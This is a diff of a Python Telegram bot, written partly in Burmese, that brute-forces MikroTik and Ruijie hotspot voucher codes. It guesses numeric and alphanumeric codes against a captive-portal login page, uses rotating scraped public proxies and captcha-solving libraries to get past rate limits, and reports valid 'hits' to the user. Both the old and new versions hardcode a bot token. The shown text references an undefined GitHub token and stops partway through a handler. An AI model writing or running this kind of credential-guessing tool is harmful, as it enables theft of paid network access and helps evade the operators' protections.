@@ -1,724 +1,704 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
-"""WOOLAY MIKROTIK - Error Fix + Diagnostics"""
+"""
+==========================================================================
+☠️ DUAL-ENGINE VOUCHER HARVESTER (MIKROTIK & RUIJIE) ☠️
+ Supreme Auto-Proxy Nexus + GitHub Vault | Telegram Bot
+--------------------------------------------------------------------------
+ DUAL PLATFORM SCANNER WITH MYANMAR INTERFACE & 24/7 STABILITY
+==========================================================================
+"""
 
 import os
 import sys
+import re
 import json
-import time
+import base64
 import random
-import threading
-import datetime
-import socket
-import concurrent.futures
-from typing import Optional, Set, List, Dict
+import string
+import time
+import uuid
+import asyncio
+from datetime import datetime, timedelta, timezone
 
-import requests
-requests.packages.urllib3.disable_warnings()
+from telebot.async_telebot import AsyncTeleBot
+from aiohttp import web
+import aiohttp
+from aiohttp_socks import ProxyConnector
+import cv2
+import ddddocr
+import numpy as np
+from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
 
-from telegram import InlineKeyboardButton, InlineKeyboardMarkup
-from telegram.constants import ParseMode
-from telegram.ext import (
-    Application, CommandHandler, MessageHandler,
-    CallbackQueryHandler, filters,
-)
+BOT_TOKEN = '8806693453:AAEK1F7FTsAHMc5PdfeIYeIlWHJgbnGRb8o'
+REPO_OWNER = "repo"
+REPO_NAME = "Lord_of_barkness"
 
-from flask import Flask
-from threading import Thread
+SUCCESS_CODE = asyncio.Queue()
+bot = AsyncTeleBot(BOT_TOKEN)
+user_data = {}
+scan_tasks = {}
+success_messages = {}
+success_texts = {}
+limited_messages = {}
+limited_texts = {}
+captcha_state = {}
+retry_counts = {}
 
-# ═══════════════════════════════════════════════════════════════
-#  KEEP ALIVE
-# ═══════════════════════════════════════════════════════════════
+session = None
+_connector = None
+CONCURRENCY = 1500
+_voucher_sem = None
+_start_time = time.monotonic()
 
-_flask = Flask(__name__)
-@_flask.route("/")
-def _home(): return "WOOLAY alive", 200
+# ==============================================================================
+#  PROXY NEXUS (AUTO PROXY POOL & ROTATOR)
+# ==============================================================================
+PROXY_POOL = []
+BAD_PROXIES = set()
+PROXY_LOCK = asyncio.Lock()
 
-def _flask_run():
-    _flask.run(host="0.0.0.0", port=int(os.environ.get("PORT", 8080)))
-
-def keep_alive():
-    Thread(target=_flask_run, daemon=True).start()
-
-# ═══════════════════════════════════════════════════════════════
-#  CONFIG
-# ═══════════════════════════════════════════════════════════════
-
-BOT_TOKEN  = "8806693453:AAEK1F7FTsAHMc5PdfeIYeIlWHJgbnGRb8o"
-OWNER      = "@Woolay"
-OWNER_LINK = "https://t.me/Woolay"
-
-HIT_FILE   = "hits.txt"
-PROXY_FILE = "proxies.txt"
-STATE_FILE = "state.json"
-
-NUM_WORKERS    = 50
-CODE_LENGTH    = 7
-CODE_TOTAL     = 10 ** CODE_LENGTH
-REQ_TIMEOUT    = 15
-
-USER_AGENTS = [
-    "Mozilla/5.0 (Linux; Android 14; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
-    "Mozilla/5.0 (Linux; Android 13; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Mobile Safari/537.36",
-    "Mozilla/5.0 (Linux; Android 12; S21) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
-]
-
-# ═══════════════════════════════════════════════════════════════
-#  GLOBAL
-# ═══════════════════════════════════════════════════════════════
-
-scanners: Dict[int, dict] = {}
-
-# ═══════════════════════════════════════════════════════════════
-#  URL TEST
-# ═══════════════════════════════════════════════════════════════
-
-def test_url(url: str) -> str:
-    """Test if URL works. Returns result string."""
-    # DNS check
-    try:
-        from urllib.parse import urlparse
-        parsed = urlparse(url)
-        hostname = parsed.hostname
-        if hostname:
-            ip = socket.gethostbyname(hostname)
-            if ip.startswith(("192.168.", "10.", "172.16.", "172.17.", "172.18.", "172.19.", "172.2", "172.3")):
-                return f"❌ Local IP: {ip}\nRailway ကနေ မရောက်နိုင်ဘူး"
-    except Exception as e:
-        return f"⚠️ DNS Error: {e}"
-
-    # Connection check
-    try:
-        r = requests.post(
-            url,
-            data={"dst": "http://connectivitycheck.gstatic.com/generate_204", "popup": "true", "username": "0000000", "password": ""},
-            timeout=REQ_TIMEOUT,
-            verify=False,
-            allow_redirects=True,
-        )
-        if "invalid username or password" in r.text.lower():
-            return f"✅ URL အလုပ်လုပ်သည်!\nStatus: {r.status_code}\nBad code ကို မှန်ကန်စွာ ပြန်ပေးသည်"
-        elif "already authorizing" in r.text.lower():
-            return f"✅ URL အလုပ်လုပ်သည်!\nStatus: {r.status_code}\nRate limit ဖြစ်နေသည်"
-        else:
-            return f"⚠️ Status: {r.status_code}\nBody: {r.text[:200]}"
-    except requests.exceptions.ConnectionError as e:
-        return f"❌ ConnectionError\nServer က ဝင်ခွင့်မပြုဘူး\n{e}"
-    except requests.exceptions.Timeout:
-        return f"❌ Timeout ({REQ_TIMEOUT}s)\nServer က မြန်မြန် မပြန်ပေးဘူး"
-    except Exception as e:
-        return f"❌ Error: {type(e).__name__}\n{e}"
-
-# ═══════════════════════════════════════════════════════════════
-#  PROXY
-# ═══════════════════════════════════════════════════════════════
-
-def load_proxies() -> List[str]:
-    try:
-        if not os.path.exists(PROXY_FILE):
-            return []
-        with open(PROXY_FILE) as f:
-            lines = f.read().splitlines()
-        result = []
-        for line in lines:
-            line = line.strip()
-            if not line or line.startswith("#"):
+async def fetch_public_proxies():
+    global PROXY_POOL
+    sources = [
+        "https://api.openproxylist.xyz/http.txt",
+        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
+        "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
+        "https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt",
+        "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-http.txt"
+    ]
+    new_proxies = []
+    timeout = aiohttp.ClientTimeout(total=10)
+    async with aiohttp.ClientSession(timeout=timeout) as temp_session:
+        for url in sources:
+            try:
+                async with temp_session.get(url) as resp:
+                    if resp.status == 200:
+                        text = await resp.text()
+                        for line in text.splitlines():
+                            line = line.strip()
+                            if line and ":" in line and not line.startswith("#"):
+                                if not line.startswith(("http://", "https://", "socks4://", "socks5://")):
+                                    line = "http://" + line
+                                new_proxies.append(line)
+            except Exception:
                 continue
-            if not line.startswith(("http://", "https://", "socks4://", "socks5://")):
-                line = "socks5://" + line
-            result.append(line)
-        return result
-    except Exception:
-        return []
+    async with PROXY_LOCK:
+        if new_proxies:
+            PROXY_POOL = list(set(new_proxies))
 
-def save_proxies(proxies: List[str]):
-    try:
-        with open(PROXY_FILE, "w") as f:
-            f.write("\n".join(proxies))
-    except Exception:
-        pass
-
-def add_proxies(lines: List[str]) -> tuple:
-    current = load_proxies()
-    added = 0
-    invalid = 0
-    for line in lines:
-        line = line.strip()
-        if not line or line.startswith("#"):
-            continue
-        if not line.startswith(("http://", "https://", "socks4://", "socks5://")):
-            line = "socks5://" + line
-        if line in current:
-            invalid += 1
-            continue
-        current.append(line)
-        added += 1
-    if added:
-        save_proxies(current)
-    return added, invalid
-
-# ═══════════════════════════════════════════════════════════════
-#  STATE
-# ═══════════════════════════════════════════════════════════════
-
-def load_state(uid: int) -> dict:
-    try:
-        if not os.path.exists(STATE_FILE):
-            return {}
-        with open(STATE_FILE, "r") as f:
-            return json.load(f).get(str(uid), {})
-    except Exception:
-        return {}
-
-def save_state(uid: int, data: dict):
-    try:
-        all_data = {}
-        if os.path.exists(STATE_FILE):
-            with open(STATE_FILE, "r") as f:
-                all_data = json.load(f)
-        all_data[str(uid)] = data
-        with open(STATE_FILE, "w") as f:
-            json.dump(all_data, f, indent=2)
-    except Exception:
-        pass
-
-# ═══════════════════════════════════════════════════════════════
-#  CHECKER
-# ═══════════════════════════════════════════════════════════════
-
-def check_one_code(code: str, login_url: str, proxy: Optional[str] = None) -> tuple:
-    """Check one code. Returns: (result, error_detail)"""
-
-    dst = f"http://192.168.{random.randint(0,255)}.{random.randint(1,254)}/"
-    ua = random.choice(USER_AGENTS)
-
-    headers = {
-        "Accept":                    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
-        "Accept-Language":           "en-US,en;q=0.9",
-        "Content-Type":              "application/x-www-form-urlencoded",
-        "User-Agent":                ua,
-        "Upgrade-Insecure-Requests": "1",
-    }
-
-    data = {
-        "dst":      dst,
-        "popup":    "true",
-        "username": code,
-        "password": "",
-    }
-
-    proxy_dict = None
-    if proxy:
-        proxy_dict = {"http": proxy, "https": proxy}
-
-    try:
-        r = requests.post(
-            login_url,
-            data=data,
-            headers=headers,
-            proxies=proxy_dict,
-            timeout=REQ_TIMEOUT,
-            verify=False,
-            allow_redirects=True,
-        )
-        body = r.text.lower()
-
-        # HIT
-        if "you are logged in" in body:
-            return "hit", ""
-
-        if ("invalid username or password" not in body
-            and "already authorizing" not in body
-            and "error" not in body
-            and len(r.text) > 100):
-            return "hit", ""
-
-        # BAD
-        if "invalid username or password" in body:
-            return "bad", ""
-
-        # LIMIT
-        if any(w in body for w in ["already authorizing", "retry later", "request limited", "too many"]):
-            return "limit", ""
-
-        return "bad", ""
-
-    except requests.exceptions.Timeout:
-        return "net", "Timeout"
-    except requests.exceptions.ConnectionError:
-        return "net", "ConnErr"
-    except Exception as e:
-        return "net", type(e).__name__
-
-# ═══════════════════════════════════════════════════════════════
-#  SCANNER
-# ═══════════════════════════════════════════════════════════════
-
-def run_scanner_thread(uid: int, login_url: str, mode: str, start_counter: int, bot):
-    state = scanners.get(uid)
-    if state is None:
-        return
-
-    proxies = load_proxies()
-    proxy_idx = 0
-    tried_set: Set[str] = set()
-    counter = start_counter
-    tried_n = 0
-    hits = 0
-    limits = 0
-    net_err = 0
-    bad_count = 0
-    last_hit = None
-    current_code = None
-    hit_list = []
-    last_error = ""
-    error_types = {}  # Count error types
-
-    start_time = time.time()
-
-    def get_proxy():
-        nonlocal proxy_idx
-        if not proxies:
-            return None
-        p = proxies[proxy_idx % len(proxies)]
-        proxy_idx += 1
-        return p
-
-    def send_dashboard():
-        elapsed = max(time.time() - start_time, 1)
-        speed = int(tried_n / elapsed * 60)
-        px_txt = f"🕷️ {len(proxies)}" if proxies else "⚡ DIRECT"
-
-        # Error breakdown
-        err_parts = []
-        if net_err > 0:
-            err_parts.append(f"Net:{net_err}")
-        if limits > 0:
-            err_parts.append(f"Lim:{limits}")
-        err_str = " | ".join(err_parts) if err_parts else "0"
-
-        hit_lines = ""
-        for h in hit_list[-5:]:
-            hit_lines += f"\n  ▸ <code>{h}</code>"
-        if not hit_list:
-            hit_lines = "\n  💀 None yet"
-
-        txt = (
-            "╔═════════════════════════╗\n"
-            "║  ⚡ <b>WOOLAY MIKROTIK</b> ⚡  ║\n"
-            "╚═════════════════════════╝\n\n"
-            "🔍 <b>SEARCHING...</b>\n\n"
-            "📊 <b>STATS</b>\n"
-            f"├ ✅ Bad     <code>{bad_count:,}</code>\n"
-            f"├ 🩸 Hits    <code>{hits}</code>\n"
-            f"├ ⚠️ Errors  <code>{err_str}</code>\n"
-            f"├ 👁️ Total   <code>{tried_n:,}</code>\n\n"
-            "⚡ <b>SPEED</b>\n"
-            f"├ 🚀 <code>{speed:,} c/m</code>\n"
-            f"├ 👥 Workers <code>{NUM_WORKERS}</code>\n"
-            f"└ 🕷️ <code>{px_txt}</code>\n\n"
-            "🎯 <b>NOW</b>\n"
-            f"├ 🔮 <code>{current_code or '—'}</code>\n"
-            f"├ 🗡️ <code>{last_hit or '—'}</code>\n"
-            f"└ 📜 <code>{last_error or 'OK'}</code>\n\n"
-            f"🎁 <b>HITS • {len(hit_list)}</b>"
-            f"{hit_lines}\n\n"
-            f"╭─ ⚡ WOOLAY ─╮"
-        )
+async def proxy_refresher_daemon():
+    while True:
         try:
-            bot.edit_message_text(
-                chat_id=uid,
-                message_id=state.get("dash_id"),
-                text=txt,
-                parse_mode=ParseMode.HTML,
-                reply_markup=InlineKeyboardMarkup(
-                    [[InlineKeyboardButton("🛑 STOP", callback_data="stop_scan")]]
-                ),
-            )
+            await fetch_public_proxies()
         except Exception:
             pass
+        await asyncio.sleep(1800)
 
-    last_dash = 0
+async def get_next_proxy():
+    async with PROXY_LOCK:
+        if not PROXY_POOL:
+            return None
+        valid_proxies = [p for p in PROXY_POOL if p not in BAD_PROXIES]
+        if not valid_proxies:
+            BAD_PROXIES.clear()
+            valid_proxies = PROXY_POOL
+        return random.choice(valid_proxies)
 
-    with concurrent.futures.ThreadPoolExecutor(max_workers=NUM_WORKERS) as executor:
-        futures = {}
+async def mark_proxy_bad(proxy):
+    async with PROXY_LOCK:
+        if proxy:
+            BAD_PROXIES.add(proxy)
 
-        while not state["stop_flag"].is_set():
+# ==============================================================================
+#  WEB SERVER FOR 24/7 UPTIME
+# ==============================================================================
+async def handle(request):
+    return web.Response(text="⚔️ DUAL-ENGINE MATRIX CORE ACTIVE 24/7 ⚔️")
 
-            # Submit new codes
-            submit_count = 0
-            while len(futures) < NUM_WORKERS and submit_count < NUM_WORKERS:
-                if mode == "num7":
-                    if counter >= CODE_TOTAL:
-                        break
-                    code = str(counter).zfill(CODE_LENGTH)
-                    counter += 1
-                else:
-                    code = str(random.randint(0, CODE_TOTAL - 1)).zfill(CODE_LENGTH)
+async def web_server():
+    app = web.Application()
+    app.router.add_get('/', handle)
+    runner = web.AppRunner(app)
+    await runner.setup()
+    port = int(os.environ.get('PORT', 8099))
+    site = web.TCPSite(runner, '0.0.0.0', port)
+    await site.start()
 
-                if code in tried_set:
-                    continue
-                tried_set.add(code)
-
-                proxy = get_proxy()
-                future = executor.submit(check_one_code, code, login_url, proxy)
-                futures[future] = code
-                submit_count += 1
-
-            if not futures:
-                break
-
-            # Collect done results
-            done, not_done = concurrent.futures.wait(
-                futures.keys(), timeout=1.0,
-                return_when=concurrent.futures.FIRST_COMPLETED,
-            )
-
-            for fut in done:
-                code = futures.pop(fut)
-                try:
-                    result, err_detail = fut.result()
-                except Exception as e:
-                    result = "net"
-                    err_detail = type(e).__name__
-
-                tried_n += 1
-                current_code = code
-
-                if result == "hit":
-                    hits += 1
-                    hit_list.append(code)
-                    last_hit = code
-                    last_error = f"🔥 HIT: {code}"
-                    try:
-                        with open(HIT_FILE, "a") as f:
-                            f.write(f"[{datetime.datetime.now():%Y-%m-%d %H:%M:%S}] {code}\n")
-                    except Exception:
-                        pass
-                    try:
-                        bot.send_message(uid, f"🎉 <b>HIT!</b>\n🔑 <code>{code}</code>", parse_mode=ParseMode.HTML)
-                    except Exception:
-                        pass
-
-                elif result == "bad":
-                    bad_count += 1
-                    last_error = "✅ OK"
-
-                elif result == "limit":
-                    limits += 1
-                    last_error = "⚠️ LIMIT"
-
-                elif result == "net":
-                    net_err += 1
-                    last_error = f"❌ {err_detail}"
-                    # Track error types
-                    error_types[err_detail] = error_types.get(err_detail, 0) + 1
-
-            # Dashboard every 3 sec
-            now = time.time()
-            if now - last_dash >= 3:
-                send_dashboard()
-                last_dash = now
-
-            # If too many net errors, slow down
-            if net_err > 10 and tried_n > 0:
-                ratio = net_err / tried_n
-                if ratio > 0.8:
-                    # 80% errors - slow down
-                    time.sleep(2)
-                    if net_err > 100 and hits == 0:
-                        # Too many errors, probably URL doesn't work
-                        try:
-                            bot.send_message(
-                                uid,
-                                "❌ <b>Too many connection errors!</b>\n\n"
-                                f"Tested: {tried_n}\n"
-                                f"Net Errors: {net_err}\n"
-                                f"Hits: {hits}\n\n"
-                                "🔍 URL ကို စစ်ဆေးပါ:\n"
-                                "1. Server က cloud IP ခွင့်ပြုလား?\n"
-                                "2. Proxy ထည့်လား?\n"
-                                "3. URL မှန်လား?",
-                                parse_mode=ParseMode.HTML,
-                            )
-                        except Exception:
-                            pass
-                        state["stop_flag"].set()
-                        break
-
-    # Final dashboard
-    elapsed = max(time.time() - start_time, 1)
-    speed = int(tried_n / elapsed * 60)
-
-    hit_lines = ""
-    for h in hit_list[-20:]:
-        hit_lines += f"\n  ▸ <code>{h}</code>"
-
-    err_info = ""
-    if error_types:
-        err_info = "\n".join([f"  {k}: {v}" for k, v in error_types.items()])
-
-    txt = (
-        "╔═════════════════════════╗\n"
-        "║   💀 <b>SCAN ENDED</b> 💀    ║\n"
-        "╚═════════════════════════╝\n\n"
-        "📊 <b>FINAL</b>\n"
-        f"├ 👁️ Tested  <code>{tried_n:,}</code>\n"
-        f"├ ✅ Bad     <code>{bad_count:,}</code>\n"
-        f"├ 🩸 Hits    <code>{hits}</code>\n"
-        f"├ ⚠️ Limits  <code>{limits}</code>\n"
-        f"├ ❌ NetErr  <code>{net_err}</code>\n"
-        f"└ 🚀 Speed   <code>{speed:,} c/m</code>\n\n"
-    )
-    if err_info:
-        txt += "❌ <b>Errors:</b>\n" + err_info + "\n\n"
-    txt += (
-        f"🎁 <b>HITS • {len(hit_list)}</b>"
-        f"{hit_lines}\n\n"
-        "💾 <i>/start to resume</i>\n\n"
-        "╭─ ⚡ WOOLAY ─╮"
-    )
+# ==============================================================================
+#  GITHUB STORAGE SYNC
+# ==============================================================================
+async def get_file_content(path):
     try:
-        bot.edit_message_text(
-            uid, state.get("dash_id"), txt,
-            parse_mode=ParseMode.HTML,
-            reply_markup=InlineKeyboardMarkup(
-                [[InlineKeyboardButton("🦇 BACK", callback_data="btn_back")]]
-            ),
-        )
+        url = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/contents/{path}"
+        headers = {"Authorization": f"token {GITHUB_TOKEN}"}
+        async with session.get(url, headers=headers) as response:
+            if response.status == 200:
+                data = await response.json()
+                content = base64.b64decode(data['content']).decode('utf-8')
+                return json.loads(content), data['sha']
     except Exception:
         pass
+    return {}, None
 
-    save_state(uid, {
-        "url": login_url, "mode": mode,
-        "counter": counter, "tried_n": tried_n,
-        "hits": hits, "limits": limits, "net": net_err,
-        "last_hit": last_hit,
-        "hit_list": hit_list[-100:],
-    })
+async def update_file_content(path, content, sha, message):
+    try:
+        url = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/contents/{path}"
+        headers = {"Authorization": f"token {GITHUB_TOKEN}", "Content-Type": "application/json"}
+        encoded = base64.b64encode(json.dumps(content).encode()).decode()
+        payload = {"message": message, "content": encoded, "sha": sha}
+        async with session.put(url, headers=headers, json=payload) as response:
+            return await response.text()
+    except Exception:
+        return ""
 
-    state["running"] = False
+# ==============================================================================
+#  MYANMAR UI & INTERACTIVE KEYBOARDS
+# ==============================================================================
+def main_menu():
+    markup = InlineKeyboardMarkup(row_width=2)
+    markup.add(
+        InlineKeyboardButton("🔑 ၁။ အတည်ပြုရန် (Key)", callback_data="menu_key"),
+        InlineKeyboardButton("📥 ၂။ ဂျိတ်ဝေးလင့်ထည့်ရန် (Input)", callback_data="menu_input"),
+        InlineKeyboardButton("⚡ ၃။ စကင်န်စတင်ရန် (Scan)", callback_data="menu_scan"),
+        InlineKeyboardButton("🔄 ၄။ ဟစ်များကိုပြန်စစ်ရန် (Recheck)", callback_data="menu_recheck"),
+        InlineKeyboardButton("📋 ၅။ သိမ်းဆည်းထားသောဟစ်များ (Result)", callback_data="menu_result"),
+        InlineKeyboardButton("⏹ ၆။ ရပ်တန့်ရန် (Stop)", callback_data="menu_stop"),
+        InlineKeyboardButton("📊 ၇။ အခြေအနေ (Status)", callback_data="menu_status"),
+        InlineKeyboardButton("❓ ၈။ အသုံးပြုပုံလမ်းညွှန် (Help)", callback_data="menu_help")
+    )
+    return markup
 
-# ═══════════════════════════════════════════════════════════════
-#  KEYBOARDS
-# ═══════════════════════════════════════════════════════════════
+def platform_menu():
+    markup = InlineKeyboardMarkup(row_width=2)
+    markup.add(
+        InlineKeyboardButton("🌐 Ruijie System", callback_data="plat_ruijie"),
+        InlineKeyboardButton("📶 MikroTik System", callback_data="plat_mikrotik"),
+        InlineKeyboardButton("🔙 ပင်မမီနူးသို့ (Back)", callback_data="menu_back")
+    )
+    return markup
 
-def main_kb():
-    return InlineKeyboardMarkup([
-        [InlineKeyboardButton("🔮 LOGIN URL", callback_data="btn_url"),
-         InlineKeyboardButton("📜 MODES", callback_data="btn_mode")],
-        [InlineKeyboardButton("⚡ START", callback_data="btn_start"),
-         InlineKeyboardButton("🛑 STOP", callback_data="stop_scan")],
-        [InlineKeyboardButton("🧪 TEST URL", callback_data="btn_test"),
-         InlineKeyboardButton("🕷️ PROXIES", callback_data="btn_proxy")],
-        [InlineKeyboardButton("⚡ WOOLAY ⚡", url=OWNER_LINK)],
-    ])
+def scan_mode_menu():
+    markup = InlineKeyboardMarkup(row_width=2)
+    markup.add(
+        InlineKeyboardButton("🩸 06-DIGIT (နံပါတ် ၆ လုံး)", callback_data="scan_6"),
+        InlineKeyboardButton("🩸 07-DIGIT (နံပါတ် ၇ လုံး)", callback_data="scan_7"),
+        InlineKeyboardButton("🩸 08-DIGIT (နံပါတ် ၈ လုံး)", callback_data="scan_8"),
+        InlineKeyboardButton("🦇 06-ASCII LOWER (အင်္ဂလိပ်သေး)", callback_data="scan_ascii"),
+        InlineKeyboardButton("☠️ CYBER CHAOS (အင်္ဂလိပ်+နံပါတ်)", callback_data="scan_all"),
+        InlineKeyboardButton("🔙 ပင်မမီနူးသို့ (Back)", callback_data="menu_back")
+    )
+    return markup
 
-def mode_kb():
-    return InlineKeyboardMarkup([
-        [InlineKeyboardButton("🩸 07 Sequential", callback_data="m_num7"),
-         InlineKeyboardButton("🎲 07 Random", callback_data="m_rand7")],
-        [InlineKeyboardButton("🦇 BACK", callback_data="btn_back")],
-    ])
+@bot.message_handler(commands=['start'])
+async def start(message):
+    welcome_text = (
+        "╔═════════════════════════════════════╗\n"
+        "║      ⚔️ WOOLAY DUAL BOT ⚔️         ║\n"
+        "╚═════════════════════════════════════╝\n\n"
+        "မြန်မာဘာသာဖြင့် အလွယ်တကူ အသုံးပြုနိုင်သော စနစ်။\n"
+        "အောက်ပါ ခလုတ်များမှ တစ်ခုချင်း ရွေးချယ်အသုံးပြုပါ။"
+    )
+    await bot.reply_to(message, welcome_text, parse_mode="Markdown", reply_markup=main_menu())
 
-def back_kb():
-    return InlineKeyboardMarkup([[InlineKeyboardButton("🦇 BACK", callback_data="btn_back")]])
+@bot.message_handler(commands=['menu'])
+async def menu_command(message):
+    await bot.reply_to(message, "📋 **ပင်မ ထိန်းချုပ်ရန် မီနူး**", parse_mode="Markdown", reply_markup=main_menu())
 
-# ═══════════════════════════════════════════════════════════════
-#  HANDLERS
-# ═══════════════════════════════════════════════════════════════
+@bot.callback_query_handler(func=lambda call: True)
+async def callback_handler(call):
+    chat_id = call.message.chat.id
+    msg_id = call.message.message_id
 
-async def cmd_start(update, context):
-    uid = update.effective_user.id
-    if "mode" not in context.user_data:
-        context.user_data["mode"] = "num7"
-    if "login_url" not in context.user_data:
-        context.user_data["login_url"] = ""
+    if call.data == "menu_back":
+        await bot.edit_message_text("📋 **ပင်မ ထိန်းချုပ်ရန် မီနူး**", chat_id=chat_id, message_id=msg_id, parse_mode="Markdown", reply_markup=main_menu())
+        await call.answer()
+        return
 
-    url = context.user_data["login_url"]
-    mode = context.user_data["mode"]
-    proxies = load_proxies()
-    px = f"🕷️ {len(proxies)}" if proxies else "⚡ Direct"
-    ul = f"🔮 URL: ✅\n<code>{url}</code>" if url else "❌ URL: Not set"
+    if call.data == "menu_key":
+        user_data[chat_id] = {}
+        await bot.edit_message_text("✅ **အတည်ပြုပြီးပါပြီ!**\nယခု ဆက်လက်၍ `/input` ဖြင့် ဂျိတ်ဝေးလင့်ခ် (Session URL) ထည့်ပါ။", chat_id=chat_id, message_id=msg_id, parse_mode="Markdown", reply_markup=main_menu())
+        await call.answer()
+        return
 
-    sv = load_state(uid)
-    rv = ""
-    if sv:
-        rv = (f"\n💾 <b>Saved</b>\n"
-              f"├ Tried: <code>{sv.get('tried_n',0):,}</code>\n"
-              f"└ Hits:  <code>{sv.get('hits',0)}</code>\n")
+    if call.data == "menu_input":
+        await bot.edit_message_text("📥 **ဂျိတ်ဝေးလင့်ခ် ထည့်သွင်းခြင်း**\n\nပုံစံ- `/input သင့်ရဲ့လင့်ခ်` ဟု ရိုက်ထည့်ပါ။", chat_id=chat_id, message_id=msg_id, parse_mode="Markdown", reply_markup=main_menu())
+        await call.answer()
+        return
 
-    txt = (f"╔═════════════════════════╗\n"
-           "║     ⚡ <b>WOOLAY</b> ⚡       ║\n"
-           "╚═════════════════════════╝\n\n"
-           f"📜 Mode: <code>{mode}</code>\n"
-           f"{px}\n"
-           f"⚡ Workers: <code>{NUM_WORKERS}</code>\n"
-           f"{ul}\n{rv}\n"
-           "💡 <i>/stop to stop</i>\n"
-           "🧪 <i>TEST URL နှိပ်ပီး စစ်ဆေးပါ</i>")
+    if call.data == "menu_scan":
+        await bot.edit_message_text("🌐 **စကင်န်ဖတ်မည့် စနစ်အမျိုးအစားကို ရွေးချယ်ပါ:**", chat_id=chat_id, message_id=msg_id, parse_mode="Markdown", reply_markup=platform_menu())
+        await call.answer()
+        return
 
-    await update.message.reply_text(txt, parse_mode=ParseMode.HTML, reply_markup=main_kb())
+    if call.data == "plat_ruijie":
+        if chat_id not in user_data:
+            user_data[chat_id] = {}
+        user_data[chat_id]['platform'] = 'ruijie'
+        await bot.edit_message_text("📜 **Ruijie စကင်န်မုဒ်ကို ရွေးချယ်ပါ:**", chat_id=chat_id, message_id=msg_id, parse_mode="Markdown", reply_markup=scan_mode_menu())
+        await call.answer()
+        return
 
-async def cmd_stop(update, context):
-    uid = update.effective_user.id
-    st = scanners.get(uid)
-    if st and st.get("running"):
-        st["stop_flag"].set()
-        await update.message.reply_text("🛑 <b>Stopping...</b>", parse_mode=ParseMode.HTML)
+    if call.data == "plat_mikrotik":
+        if chat_id not in user_data:
+            user_data[chat_id] = {}
+        user_data[chat_id]['platform'] = 'mikrotik'
+        await bot.edit_message_text("📜 **MikroTik စကင်န်မုဒ်ကို ရွေးချယ်ပါ:**", chat_id=chat_id, message_id=msg_id, parse_mode="Markdown", reply_markup=scan_mode_menu())
+        await call.answer()
+        return
+
+    if call.data.startswith("scan_"):
+        mode_map = {"scan_6": "6", "scan_7": "7", "scan_8": "8", "scan_ascii": "ascii-lower", "scan_all": "all"}
+        mode = mode_map.get(call.data, "6")
+        if chat_id not in user_data:
+            user_data[chat_id] = {}
+        user_data[chat_id]['scan_mode'] = mode
+        
+        platform = user_data[chat_id].get('platform', 'ruijie')
+        await bot.edit_message_text(f"⚡ **စတင် စကင်န်ဖတ်နေပါပြီ...** Platform: `{platform.upper()}` | Mode: `{mode}`", chat_id=chat_id, message_id=msg_id, parse_mode="Markdown", reply_markup=main_menu())
+        
+        class FakeMessage:
+            def __init__(self, cid):
+                self.chat = type('obj', (object,), {'id': cid})()
+        fake_msg = FakeMessage(chat_id)
+        await scan(fake_msg, mode)
+        await call.answer()
+        return
+
+    if call.data == "menu_recheck":
+        await bot.edit_message_text("🔄 **သိမ်းဆည်းထားသော ဟစ်များကို ပြန်လည်စစ်ဆေးနေပါပြီ...**", chat_id=chat_id, message_id=msg_id, parse_mode="Markdown", reply_markup=main_menu())
+        await recheck(call.message)
+        await call.answer()
+        return
+
+    if call.data == "menu_result":
+        await bot.edit_message_text("📋 **ရရှိထားသော ဟစ်များကို ထုတ်ယူနေပါပြီ...**", chat_id=chat_id, message_id=msg_id, parse_mode="Markdown", reply_markup=main_menu())
+        await handle_result(call.message)
+        await call.answer()
+        return
+
+    if call.data == "menu_stop":
+        await bot.edit_message_text("⏹ **အလုပ်လုပ်နေမှုကို ရပ်တန့်လိုက်ပါပြီ။**", chat_id=chat_id, message_id=msg_id, parse_mode="Markdown", reply_markup=main_menu())
+        await stop_scan(call.message)
+        await call.answer()
+        return
+
+    if call.data == "menu_status":
+        await status(call.message)
+        await call.answer()
+        return
+
+    if call.data == "menu_help":
+        help_text = (
+            "📖 **မြန်မာဘာသာ အသုံးပြုပုံလမ်းညွှန်**\n\n"
+            "၁။ `/key` - စနစ်ကို စတင်အသုံးပြုရန် ခွင့်ပြုချက်ရယူပါ။\n"
+            "၂။ `/input <url>` - Ruijie သို့မဟုတ် MikroTik လင့်ခ်ကို ထည့်ပါ။\n"
+            "၃။ `/scan` - စကင်န်ဖတ်မည့် ပလပ်ဖောင်းနှင့် ပုံစံကို ရွေးချယ်ပါ။\n"
+            "၄။ `/recheck` - ရထားသော ကုဒ်များ သက်တမ်းရှိမရှိ ပြန်စစ်ပါ။\n"
+            "၅။ `/result` - အောင်မြင်ထားသော ကုဒ်များကို ကြည့်ပါ။\n"
+            "၆။ `/stop` - လုပ်ဆောင်ချက်ကို ရပ်ရန်။"
+        )
+        await bot.edit_message_text(help_text, chat_id=chat_id, message_id=msg_id, parse_mode="Markdown", reply_markup=main_menu())
+        await call.answer()
+        return
+
+# ==============================================================================
+#  COMMAND HANDLERS
+# ==============================================================================
+@bot.message_handler(commands=['key'])
+async def handle_key(message):
+    user_data[message.chat.id] = {}
